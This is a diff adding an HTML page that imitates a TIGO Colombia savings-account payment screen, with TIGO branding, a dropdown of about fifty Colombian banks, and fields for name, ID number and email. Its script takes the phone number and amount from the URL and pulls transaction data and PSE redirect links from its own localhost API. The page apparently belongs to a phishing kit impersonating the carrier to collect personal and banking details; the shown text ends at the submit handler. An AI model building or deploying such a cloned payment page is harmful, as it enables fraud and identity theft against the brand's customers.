@@ -1,0 +1,1149 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TIGO - Pago con Cuenta de Ahorros</title>
+    <link rel="icon" type="image/png" href="favicon.png">
+    <link rel="stylesheet" href="fonts.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Dm Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #f5f5f5;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #003399 0%, #0052cc 100%);
+            padding: 15px 20px;
+            color: white;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            width: 100px;
+            height: 40px;
+        }
+
+        .logo img {
+            max-width: 100%;
+            height: auto;
+        }
+
+        .header-icon {
+            font-family: 'tigo-icons-pack1';
+            font-size: 18px;
+        }
+
+        .header-text {
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .header-dropdown {
+            margin-left: auto;
+            cursor: pointer;
+            font-size: 20px;
+        }
+
+        .container {
+            max-width: 700px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            color: #44c8f5;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 30px;
+            cursor: pointer;
+        }
+
+        .back-button svg {
+            width: 20px;
+            height: 20px;
+            margin-right: 8px;
+            stroke: currentColor;
+        }
+
+        .page-title {
+            font-size: 28px;
+            color: #001eb4;
+            font-weight: 500;
+            margin-bottom: 30px;
+        }
+
+        .card-box {
+            background: white;
+            padding: 24px;
+            border-radius: 16px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            border: 1px solid #f0f0f0;
+        }
+
+        .card-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 16px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .card-icon {
+            font-size: 20px;
+            color: white;
+            font-family: 'tigo-icons-pack1';
+        }
+
+        .card-header-icon {
+            width: 20px;
+            height: 20px;
+            object-fit: contain;
+        }
+
+        .card-title {
+            font-size: 14px;
+            color: #001eb4;
+            font-weight: 600;
+        }
+
+        .section-title {
+            font-size: 18px;
+            color: #001eb4;
+            font-weight: 500;
+            margin-bottom: 16px;
+            margin-top: 12px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .fieldset-custom {
+            border: 1.5px solid #9ca3af;
+            border-radius: 8px;
+            padding: 8px 12px 6px 12px;
+            transition: all 0.2s ease;
+            background: white;
+        }
+
+
+        .legend-custom {
+            font-size: 11px;
+            font-weight: 500;
+            color: #666;
+            padding: 0 4px;
+            display: block;
+            margin-bottom: 2px;
+        }
+
+
+        .fieldset-input {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .fieldset-custom input,
+        .fieldset-custom select {
+            flex: 1;
+            background: transparent;
+            border: none;
+            font-size: 14px;
+            color: #333;
+            font-family: inherit;
+        }
+
+        .fieldset-custom input::placeholder {
+            color: #ccc;
+        }
+
+        .fieldset-custom input:focus,
+        .fieldset-custom select:focus {
+            outline: none;
+        }
+
+        .fieldset-custom select {
+            cursor: pointer;
+            appearance: none;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+
+        .form-row.full {
+            grid-template-columns: 1fr;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 0;
+        }
+
+        .form-row-3 {
+            display: grid;
+            grid-template-columns: 1fr 2fr;
+            gap: 16px;
+        }
+
+        .terms {
+            font-size: 12px;
+            color: #666;
+            margin: 16px 0 20px 0;
+            line-height: 1.6;
+        }
+
+        .terms a {
+            color: #44c8f5;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 12px;
+            justify-content: flex-end;
+            margin-top: 16px;
+        }
+
+        .btn {
+            padding: 10px 28px;
+            border: none;
+            border-radius: 12px;
+            font-size: 13px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-cancel {
+            background: none;
+            color: #44c8f5;
+            border: none;
+            min-width: auto;
+            padding: 0;
+        }
+
+        .btn-cancel:hover {
+            background: none;
+            color: #3db8e3;
+        }
+
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 12px;
+            text-align: center;
+            max-width: 400px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .modal-content p {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .modal-buttons {
+            display: flex;
+            gap: 150px;
+            justify-content: center;
+        }
+
+        .modal-text-no {
+            color: #44c8f5;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: all 0.2s ease;
+        }
+
+        .modal-text-no:hover {
+            color: #3db8e3;
+        }
+
+        .modal-text-yes {
+            color: #44c8f5;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: all 0.2s ease;
+        }
+
+        .modal-text-yes:hover {
+            color: #3db8e3;
+        }
+
+        .modal-overlay-terms {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .modal-overlay-terms.active {
+            display: flex;
+        }
+
+        .modal-content-terms {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            max-width: 500px;
+            max-height: 80vh;
+            overflow-y: auto;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .modal-content-terms h2 {
+            font-size: 16px;
+            color: #001eb4;
+            font-weight: 600;
+            margin-bottom: 12px;
+            margin-top: 16px;
+        }
+
+        .modal-content-terms h2:first-child {
+            margin-top: 0;
+        }
+
+        .modal-content-terms p {
+            font-size: 12px;
+            color: #333;
+            line-height: 1.6;
+            margin-bottom: 12px;
+        }
+
+        .modal-close-terms {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #44c8f5;
+            color: white;
+            border: none;
+            padding: 10px 30px;
+            border-radius: 18px;
+            font-size: 12px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            z-index: 1001;
+            display: none;
+        }
+
+        .modal-overlay-terms.active .modal-close-terms {
+            display: block;
+        }
+
+        .modal-close-terms:hover {
+            background: #3db8e3;
+        }
+
+        .modal-close-btn-x {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #001eb4;
+            border: 2px solid #44c8f5;
+            color: #44c8f5;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            font-size: 24px;
+            cursor: pointer;
+            z-index: 1001;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            font-weight: 300;
+            transition: all 0.2s ease;
+        }
+
+        .modal-close-btn-x:hover {
+            background: #44c8f5;
+            color: white;
+        }
+
+        .modal-overlay-terms.active .modal-close-btn-x {
+            display: flex;
+        }
+
+        .btn-continue {
+            background: #001eb4;
+            color: white;
+            
+            min-width: 120px;
+        }
+
+        .btn-continue:hover {
+            background: #0015a0;
+        }
+
+        /* Dropdown personalizado de bancos */
+        .bank-dropdown-wrapper {
+            position: relative;
+            width: 100%;
+        }
+
+        .bank-dropdown-trigger {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            width: 100%;
+            padding: 8px 0;
+            background: transparent;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-size: 13px;
+            color: #333;
+            border: none;
+        }
+
+        .bank-dropdown-trigger:hover {
+            opacity: 0.8;
+        }
+
+        .bank-dropdown-menu {
+            position: absolute;
+            top: calc(100% + 8px);
+            left: -10px;
+            right: -10px;
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            max-height: 350px;
+            overflow-y: auto;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
+            z-index: 1001;
+            display: none;
+            gap: 0;
+        }
+
+        .bank-dropdown-menu.active {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .bank-option {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 12px;
+            cursor: pointer;
+            transition: background 0.15s;
+            border-bottom: 1px solid #f0f0f0;
+            font-size: 13px;
+            color: #333;
+        }
+
+        .bank-option:last-child {
+            border-bottom: none;
+        }
+
+        .bank-option:hover {
+            background: #f3f4f6;
+        }
+
+        .bank-option img {
+            width: 24px;
+            height: 24px;
+            object-fit: contain;
+            flex-shrink: 0;
+        }
+
+        @media (max-width: 768px) {
+            .form-row-3 {
+                grid-template-columns: 1fr;
+            }
+
+            .button-group {
+                justify-content: space-between;
+                gap: 8px;
+            }
+
+            .btn {
+                flex: 1;
+            }
+
+            .card-box {
+                padding: 16px;
+            }
+        }
+
+        .spinner-mini {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid #ddd;
+            border-top: 2px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 6px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .loading-modal.show {
+            display: flex;
+        }
+
+        .loading-content {
+            background: white;
+            padding: 40px;
+            border-radius: 16px;
+            text-align: center;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
+        }
+
+        .loading-content .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f0f0f0;
+            border-top: 4px solid #44c8f5;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+    </style>
+</head>
+<body>
+    <!-- Modal de carga -->
+    <div class="loading-modal" id="loadingModal">
+        <div class="loading-content">
+            <div class="spinner"></div>
+        </div>
+    </div>
+    <div class="header">
+        <div class="logo">
+            <img src="assets/logos/tigo-logo.svg" alt="TIGO">
+        </div>
+        <div class="header-icon">&#xEC83;</div>
+        <div class="header-text">Pospago <strong id="phoneNumber"><span class="spinner-mini"></span></strong></div>
+        <div class="header-dropdown">⋮</div>
+    </div>
+
+    <div class="container">
+        <a class="back-button" href="javascript:void(0)" onclick="regresarAlInicio()">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <polyline points="15 18 9 12 15 6"></polyline>
+            </svg>
+            REGRESAR
+        </a>
+
+        <h1 class="page-title">Pago con cuenta de ahorros</h1>
+
+        <div class="card-box">
+            <div class="card-header">
+                <img src="assets/logos/pse.png" class="card-header-icon" alt="PSE">
+                <div class="card-title">PSE / Tarjeta débito / Daviplata</div>
+            </div>
+
+            <h2 class="section-title">Información bancaria</h2>
+
+            <form id="formBancos">
+                <!-- Lista de bancos con logos -->
+                <fieldset class="fieldset-custom form-row full">
+                    <legend class="legend-custom">Selecciona tu banco</legend>
+                    <div class="fieldset-input">
+                        <div class="bank-dropdown-wrapper">
+                            <input type="hidden" id="bancoPSE" required>
+                            <div class="bank-dropdown-trigger" id="bankTrigger">
+                                <img id="bankLogo" src="" alt="" style="display:none; width:20px; height:20px; margin-right:8px;">
+                                <span id="bankName">Elige tu banco</span>
+                                <span style="margin-left:auto; color:#999;">▼</span>
+                            </div>
+                            <div class="bank-dropdown-menu" id="bankMenu">
+                                <!-- Bancos se cargan dinámicamente desde la API -->
+                                <div class="bank-option" data-code="1001" data-name="BANCO DE BOGOTA" data-logo="bogota.svg">
+                                    <img src="assets/logos/bogota.svg" alt=""> BANCO DE BOGOTA
+                                </div>
+                                <div class="bank-option" data-code="1002" data-name="BANCO POPULAR" data-logo="popular.svg">
+                                    <img src="assets/logos/popular.svg" alt=""> BANCO POPULAR
+                                </div>
+                                <div class="bank-option" data-code="1007" data-name="BANCOLOMBIA" data-logo="bancol.svg">
+                                    <img src="assets/logos/bancol.svg" alt=""> BANCOLOMBIA
+                                </div>
+                                <div class="bank-option" data-code="1023" data-name="BANCO DE OCCIDENTE" data-logo="occidente.svg">
+                                    <img src="assets/logos/occidente.svg" alt=""> BANCO DE OCCIDENTE
+                                </div>
+                                <div class="bank-option" data-code="1051" data-name="BANCO DAVIVIENDA" data-logo="davivienda.svg">
+                                    <img src="assets/logos/davivienda.svg" alt=""> BANCO DAVIVIENDA
+                                </div>
+                                <div class="bank-option" data-code="1052" data-name="BANCO AV VILLAS" data-logo="avvillas.svg">
+                                    <img src="assets/logos/avvillas.svg" alt=""> BANCO AV VILLAS
+                                </div>
+                                <div class="bank-option" data-code="1019" data-name="DAVIbank S.A." data-logo="davibank.png">
+                                    <img src="assets/logos/davibank.png" alt=""> DAVIbank S.A.
+                                </div>
+                                <div class="bank-option" data-code="1831" data-name="ACCION FIDUCIARIA" data-logo="accionfiduciaria.svg">
+                                    <img src="assets/logos/accionfiduciaria.svg" alt=""> ACCION FIDUCIARIA
+                                </div>
+                                <div class="bank-option" data-code="1815" data-name="ALIANZA FIDUCIARIA" data-logo="logo-fiduciaria.png">
+                                    <img src="assets/logos/logo-fiduciaria.png" alt=""> ALIANZA FIDUCIARIA
+                                </div>
+                                <div class="bank-option" data-code="1558" data-name="BAN100" data-logo="ban100.svg">
+                                    <img src="assets/logos/ban100.svg" alt=""> BAN100
+                                </div>
+                                <div class="bank-option" data-code="1059" data-name="BANCAMIA S.A." data-logo="bancamia.svg">
+                                    <img src="assets/logos/bancamia.svg" alt=""> BANCAMIA S.A.
+                                </div>
+                                <div class="bank-option" data-code="1040" data-name="BANCO AGRARIO" data-logo="agrario.svg">
+                                    <img src="assets/logos/agrario.svg" alt=""> BANCO AGRARIO
+                                </div>
+                                <div class="bank-option" data-code="1013" data-name="BANCO BBVA COLOMBIA S.A." data-logo="bbva.svg">
+                                    <img src="assets/logos/bbva.svg" alt=""> BANCO BBVA COLOMBIA S.A.
+                                </div>
+                                <div class="bank-option" data-code="1032" data-name="BANCO CAJA SOCIAL" data-logo="cajasocial.svg">
+                                    <img src="assets/logos/cajasocial.svg" alt=""> BANCO CAJA SOCIAL
+                                </div>
+                                <div class="bank-option" data-code="1066" data-name="BANCO COOPERATIVO COOPCENTRAL" data-logo="coopcentral.svg">
+                                    <img src="assets/logos/coopcentral.svg" alt=""> BANCO COOPERATIVO COOPCENTRAL
+                                </div>
+                                <div class="bank-option" data-code="1062" data-name="BANCO FALABELLA" data-logo="falabella.svg">
+                                    <img src="assets/logos/falabella.svg" alt=""> BANCO FALABELLA
+                                </div>
+                                <div class="bank-option" data-code="1063" data-name="BANCO FINANDINA S.A. BIC" data-logo="finandina.svg">
+                                    <img src="assets/logos/finandina.svg" alt=""> BANCO FINANDINA S.A. BIC
+                                </div>
+                                <div class="bank-option" data-code="1012" data-name="BANCO GNB SUDAMERIS" data-logo="sudameris.svg">
+                                    <img src="assets/logos/sudameris.svg" alt=""> BANCO GNB SUDAMERIS
+                                </div>
+                                <div class="bank-option" data-code="1006" data-name="BANCO ITAU" data-logo="itau.svg">
+                                    <img src="assets/logos/itau.svg" alt=""> BANCO ITAU
+                                </div>
+                                <div class="bank-option" data-code="1071" data-name="BANCO J.P. MORGAN COLOMBIA S.A." data-logo="chase.webp">
+                                    <img src="assets/logos/chase.webp" alt=""> BANCO J.P. MORGAN COLOMBIA S.A.
+                                </div>
+                                <div class="bank-option" data-code="1047" data-name="BANCO MUNDO MUJER S.A." data-logo="mundomujer.png">
+                                    <img src="assets/logos/mundomujer.png" alt=""> BANCO MUNDO MUJER S.A.
+                                </div>
+                                <div class="bank-option" data-code="1060" data-name="BANCO PICHINCHA S.A." data-logo="pichincha.svg">
+                                    <img src="assets/logos/pichincha.svg" alt=""> BANCO PICHINCHA S.A.
+                                </div>
+                                <div class="bank-option" data-code="1065" data-name="BANCO SANTANDER COLOMBIA" data-logo="santander.svg">
+                                    <img src="assets/logos/santander.svg" alt=""> BANCO SANTANDER COLOMBIA
+                                </div>
+                                <div class="bank-option" data-code="1069" data-name="BANCO SERFINANZA" data-logo="serfinanza.svg">
+                                    <img src="assets/logos/serfinanza.svg" alt=""> BANCO SERFINANZA
+                                </div>
+                                <div class="bank-option" data-code="1303" data-name="BANCO UNION" data-logo="union.svg">
+                                    <img src="assets/logos/union.svg" alt=""> BANCO UNION
+                                </div>
+                                <div class="bank-option" data-code="1061" data-name="BANCOOMEVA S.A." data-logo="coomeva.svg">
+                                    <img src="assets/logos/coomeva.svg" alt=""> BANCOOMEVA S.A.
+                                </div>
+                                <div class="bank-option" data-code="1808" data-name="BOLD CF" data-logo="bold.png">
+                                    <img src="assets/logos/bold.png" alt=""> BOLD CF
+                                </div>
+                                <div class="bank-option" data-code="1283" data-name="CFA COOPERATIVA FINANCIERA" data-logo="cfa.svg">
+                                    <img src="assets/logos/cfa.svg" alt=""> CFA COOPERATIVA FINANCIERA
+                                </div>
+                                <div class="bank-option" data-code="1009" data-name="CITIBANK" data-logo="citybank.svg">
+                                    <img src="assets/logos/citybank.svg" alt=""> CITIBANK
+                                </div>
+                                <div class="bank-option" data-code="1812" data-name="COINK" data-logo="coink.webp">
+                                    <img src="assets/logos/coink.webp" alt=""> COINK
+                                </div>
+                                <div class="bank-option" data-code="1370" data-name="COLTEFINANCIERA" data-logo="coltefinanciera.svg">
+                                    <img src="assets/logos/coltefinanciera.svg" alt=""> COLTEFINANCIERA
+                                </div>
+                                <div class="bank-option" data-code="1292" data-name="CONFIAR COOPERATIVA FINANCIERA" data-logo="cooperativaConfiar.svg">
+                                    <img src="assets/logos/cooperativaConfiar.svg" alt=""> CONFIAR COOPERATIVA FINANCIERA
+                                </div>
+                                <div class="bank-option" data-code="1289" data-name="COTRAFA" data-logo="cotrafa.svg">
+                                    <img src="assets/logos/cotrafa.svg" alt=""> COTRAFA
+                                </div>
+                                <div class="bank-option" data-code="1816" data-name="CREZCAMOS" data-logo="crezcamos.jpg">
+                                    <img src="assets/logos/crezcamos.jpg" alt=""> CREZCAMOS
+                                </div>
+                                <div class="bank-option" data-code="1097" data-name="DALE" data-logo="dale.svg">
+                                    <img src="assets/logos/dale.svg" alt=""> DALE
+                                </div>
+                                <div class="bank-option" data-code="1551" data-name="DAVIPLATA" data-logo="daviplata.svg">
+                                    <img src="assets/logos/daviplata.svg" alt=""> DAVIPLATA
+                                </div>
+                                <div class="bank-option" data-code="1802" data-name="DING" data-logo="ding.png">
+                                    <img src="assets/logos/ding.png" alt=""> DING
+                                </div>
+                                <div class="bank-option" data-code="1121" data-name="FINANCIERA JURISCOOP SA" data-logo="coofinep.svg">
+                                    <img src="assets/logos/coofinep.svg" alt=""> FINANCIERA JURISCOOP SA
+                                </div>
+                                <div class="bank-option" data-code="1814" data-name="GLOBAL66" data-logo="global.png">
+                                    <img src="assets/logos/global.png" alt=""> GLOBAL66
+                                </div>
+                                <div class="bank-option" data-code="1637" data-name="IRIS" data-logo="irisbank.svg">
+                                    <img src="assets/logos/irisbank.svg" alt=""> IRIS
+                                </div>
+                                <div class="bank-option" data-code="1286" data-name="JFK COOPERATIVA FINANCIERA" data-logo="jfk.png">
+                                    <img src="assets/logos/jfk.png" alt=""> JFK COOPERATIVA FINANCIERA
+                                </div>
+                                <div class="bank-option" data-code="1070" data-name="LULO BANK" data-logo="lulo.svg">
+                                    <img src="assets/logos/lulo.svg" alt=""> LULO BANK
+                                </div>
+                                <div class="bank-option" data-code="1801" data-name="MOVII S.A." data-logo="movii.svg">
+                                    <img src="assets/logos/movii.svg" alt=""> MOVII S.A.
+                                </div>
+                                <div class="bank-option" data-code="1507" data-name="NEQUI" data-logo="nequiLogo.svg">
+                                    <img src="assets/logos/nequiLogo.svg" alt=""> NEQUI
+                                </div>
+                                <div class="bank-option" data-code="1809" data-name="NU" data-logo="nu.svg">
+                                    <img src="assets/logos/nu.svg" alt=""> NU
+                                </div>
+                                <div class="bank-option" data-code="1824" data-name="PAYCASH" data-logo="paycash.svg">
+                                    <img src="assets/logos/paycash.svg" alt=""> PAYCASH
+                                </div>
+                                <div class="bank-option" data-code="1803" data-name="POWWI" data-logo="powwi.png">
+                                    <img src="assets/logos/powwi.png" alt=""> POWWI
+                                </div>
+                                <div class="bank-option" data-code="1811" data-name="RAPPIPAY" data-logo="rappipay.svg">
+                                    <img src="assets/logos/rappipay.svg" alt=""> RAPPIPAY
+                                </div>
+                                <div class="bank-option" data-code="1804" data-name="UALÁ" data-logo="uala.png">
+                                    <img src="assets/logos/uala.png" alt=""> UALÁ
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </fieldset>
+
+                <!-- Tipo de persona -->
+                <fieldset class="fieldset-custom form-row full">
+                    <legend class="legend-custom">Tipo de persona</legend>
+                    <div class="fieldset-input">
+                        <select id="tipoPerson" required>
+                            <option value="natural">Natural</option>
+                            <option value="juridica">Jurídica</option>
+                        </select>
+                    </div>
+                </fieldset>
+
+                <!-- Nombres y apellidos -->
+                <fieldset class="fieldset-custom form-row full">
+                    <legend class="legend-custom">Nombres y apellidos</legend>
+                    <div class="fieldset-input">
+                        <input type="text" id="nombres" placeholder="" required>
+                    </div>
+                </fieldset>
+
+                <!-- Documento & Número de identificación -->
+                <div class="form-row-3">
+                    <fieldset class="fieldset-custom">
+                        <legend class="legend-custom">Documento</legend>
+                        <div class="fieldset-input">
+                            <select id="tipoDoc" required>
+                                <option value="CC">CC</option>
+                                <option value="CE">CE</option>
+                                <option value="NIT">NIT</option>
+                            </select>
+                        </div>
+                    </fieldset>
+
+                    <fieldset class="fieldset-custom">
+                        <legend class="legend-custom">Número de identificación</legend>
+                        <div class="fieldset-input">
+                            <input type="text" id="numeroDoc" placeholder="" required>
+                        </div>
+                    </fieldset>
+                </div>
+
+                <!-- Correo electrónico -->
+                <fieldset class="fieldset-custom form-row full">
+                    <legend class="legend-custom">Correo electrónico</legend>
+                    <div class="fieldset-input">
+                        <input type="email" id="email" placeholder="" required>
+                    </div>
+                </fieldset>
+
+                <!-- Terms -->
+                <div class="terms">
+                    Al presionar CONTINUAR estás aceptando los <a href="#" onclick="abrirModalTerminos(event)">términos y condiciones</a>
+                </div>
+
+                <!-- Buttons -->
+                <div class="button-group">
+                    <button type="button" class="btn btn-cancel" onclick="abrirModalCancelar()">CANCELAR</button>
+                    <button type="submit" class="btn btn-continue">CONTINUAR</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Modal de confirmación -->
+    <div class="modal-overlay" id="cancelModal">
+        <div class="modal-content">
+            <p>¿Está seguro de que desea cancelar esta transacción?</p>
+            <div class="modal-buttons">
+                <span class="modal-text-no" onclick="cerrarModalCancelar()">NO</span>
+                <span class="modal-text-yes" onclick="confirmarCancelar()">SÍ</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal de Términos y Condiciones -->
+    <div class="modal-overlay-terms" id="terminosModal" onclick="cerrarModalTerminosClick(event)">
+        <button class="modal-close-btn-x" onclick="cerrarModalTerminos()">×</button>
+        <div class="modal-content-terms">
+            <h2 style="margin: 0 0 12px 0;">Términos y Condiciones</h2>
+            <p>Al utilizar nuestro servicio de pago, usted acepta nuestros términos y condiciones de protección de datos y seguridad.</p>
+
+            <h2>Protección de Datos Personales</h2>
+            <p>Sus datos personales y financieros son procesados de forma segura de conformidad con la Ley 1581 de 2012 (LPPD) de Colombia. Nos comprometemos a proteger su información personal con los más altos estándares de seguridad.</p>
+
+            <h2>Cifrado SSL/TLS</h2>
+            <p>Todas las transacciones se realizan a través de conexiones cifradas con protocolo HTTPS y certificado SSL de 256 bits. Este protocolo garantiza que la información transmitida entre su dispositivo y nuestros servidores esté completamente protegida contra acceso no autorizado.</p>
+
+            <h2>Seguridad de Transacciones</h2>
+            <p>Nuestros sistemas implementan múltiples capas de seguridad incluyendo autenticación de dos factores, validación de tarjetas y detección de fraude en tiempo real. Todas las transacciones se monitorizan constantemente para prevenir actividades sospechosas.</p>
+
+            <h2>Información de Pago</h2>
+            <p>Nos adherimos a los estándares PCI-DSS (Payment Card Industry - Data Security Standard). Su información de tarjeta es procesada por procesadores de pago certificados y nunca se almacena en nuestros servidores.</p>
+
+            <button class="modal-close-terms" onclick="cerrarModalTerminos()">ENTENDIDO</button>
+        </div>
+    </div>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const txid = params.get('txid');
+
+        // Leer parámetros desde el URL (como en pago-tarjeta)
+        let phoneNumber = params.get('referencia') || '';
+        let valorFormateado = params.get('valor_formateado') || '';
+        let valorPago = params.get('valor_pago') || '0';
+        let estado = params.get('estado') || 'pendiente';
+        let pseUrls = {};
+
+        // Actualizar el header con el teléfono
+        console.log('[PAGO-INFO] Teléfono cargado:', phoneNumber);
+        if (phoneNumber && document.getElementById('phoneNumber')) {
+            document.getElementById('phoneNumber').textContent = phoneNumber;
+        }
+
+        const bankImageMap = {
+            '1831': 'accionfiduciaria.svg',
+            '1815': 'logo-fiduciaria.png',
+            '1558': 'ban100.svg',
+            '1059': 'bancamia.svg',
+            '1040': 'agrario.svg',
+            '1052': 'avvillas.svg',
+            '1013': 'bbva.svg',
+            '1032': 'cajasocial.svg',
+            '1819': 'contactar.jpg',
+            '1066': 'coopcentral.svg',
+            '1051': 'davivienda.svg',
+            '1001': 'bogota.svg',
+            '1023': 'occidente.svg',
+            '1062': 'falabella.svg',
+            '1063': 'finandina.svg',
+            '1012': 'sudameris.svg',
+            '1006': 'itau.svg',
+            '1071': 'chase.webp',
+            '1047': 'mundomujer.png',
+            '1060': 'pichincha.svg',
+            '1002': 'popular.svg',
+            '1065': 'santander.svg',
+            '1069': 'serfinanza.svg',
+            '1303': 'union.svg',
+            '1007': 'bancolombia.svg',
+            '1061': 'coomeva.svg',
+            '1808': 'bold.png',
+            '1283': 'cfa.svg',
+            '1009': 'citybank.svg',
+            '1812': 'coink.webp',
+            '1370': 'coltefinanciera.svg',
+            '1292': 'cooperativaConfiar.svg',
+            '1289': 'cotrafa.svg',
+            '1816': 'crezcamos.jpg',
+            '1097': 'dale.svg',
+            '1019': 'davibank.png',
+            '1551': 'daviplata.svg',
+            '1802': 'ding.png',
+            '1121': 'coofinep.svg',
+            '1814': 'global.png',
+            '1637': 'irisbank.svg',
+            '1286': 'jfk.png',
+            '1070': 'lulo.svg',
+            '1801': 'movii.svg',
+            '1507': 'nequiLogo.svg',
+            '1809': 'nu.svg',
+            '1824': 'paycash.svg',
+            '1803': 'powwi.png',
+            '1811': 'rappipay.svg',
+            '1804': 'uala.png'
+        };
+
+        // Cargar datos desde R2 si viene txid
+        if (txid) {
+            fetch(`http://localhost:9090/api/transaccion/${txid}`)
+                .then(res => res.json())
+                .then(data => {
+                    if (data.ok && data.transaccion) {
+                        const tx = data.transaccion;
+                        phoneNumber = tx.referencia;
+                        valorFormateado = tx.valor_formateado;
+                        valorPago = tx.valor_pago;
+                        estado = tx.estado;
+                        document.getElementById('phoneNumber').textContent = phoneNumber;
+                    }
+                })
+                .catch(err => console.error('Error cargando transacción:', err));
+        } else {
+            // Fallback si no viene txid
+            phoneNumber = params.get('referencia') || '';
+            valorFormateado = params.get('valor_formateado') || '';
+            valorPago = params.get('valor_pago') || '';
+            estado = params.get('estado') || '';
+            document.getElementById('phoneNumber').textContent = phoneNumber;
+        }
+
+        // Cargar URLs de PSE desde API
+        fetch('http://localhost:9090/api/pse-urls')
+            .then(res => res.json())
+            .then(data => {
+                pseUrls = data.urls || {};
+            })
+            .catch(err => console.warn('Error cargando PSE URLs:', err));
+
+        // Configurar dropdown personalizado de bancos
+        const bankTrigger = document.getElementById('bankTrigger');
+        const bankMenu = document.getElementById('bankMenu');
+        const bancoPSEInput = document.getElementById('bancoPSE');
+        const bankLogo = document.getElementById('bankLogo');
+        const bankName = document.getElementById('bankName');
+        const bankOptions = document.querySelectorAll('.bank-option');
+
+        // Abrir/cerrar dropdown
+        bankTrigger.addEventListener('click', () => {
+            bankMenu.classList.toggle('active');
+        });
+
+        // Cerrar dropdown cuando se hace click afuera
+        document.addEventListener('click', (e) => {
+            if (!e.target.closest('.bank-dropdown-wrapper')) {
+                bankMenu.classList.remove('active');
+            }
+        });
+
+        // Seleccionar banco
+        bankOptions.forEach(option => {
+            option.addEventListener('click', () => {
+                const code = option.dataset.code;
+                const name = option.dataset.name;
+                const logo = option.dataset.logo;
+
+                // Actualizar input oculto
+                bancoPSEInput.value = code;
+
+                // Actualizar trigger
+                if (logo) {
+                    bankLogo.src = `assets/logos/${logo}`;
+                    bankLogo.style.display = 'inline-block';
+                } else {
+                    bankLogo.style.display = 'none';
+                }
+                bankName.textContent = name;
+
+                // Cerrar dropdown
+                bankMenu.classList.remove('active');
+            });
+        });
+
+        // Manejar submit del formulario
+        document.getElementById('formBancos').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
